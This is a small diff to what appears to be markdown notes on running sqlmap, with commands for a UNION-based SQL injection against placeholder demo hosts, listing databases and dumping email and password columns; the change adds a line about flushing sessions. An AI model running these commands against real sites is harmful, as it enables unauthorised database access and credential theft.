@@ -68,7 +68,7 @@ sqlmap -u "demo.site" -p search --technique=U -v3
 ```
 
 * --dbs > Enumerate database 
-
+--flush-sessions - Flushes current session
 ```
 xyz
 information_schema
@@ -100,3 +100,4 @@ password
 ```
 sqlmap -u 'demo.local' --technique=U -D xyz -T b -C email,password --dump
 ```
+
